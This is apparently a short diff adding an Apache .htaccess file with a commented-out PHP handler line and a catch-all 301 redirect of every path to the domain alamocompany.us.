@@ -1,0 +1,3 @@
+#AddHandler php-stable .php
+
+RedirectMatch 301 ^(.*)$ https://alamocompany.us/
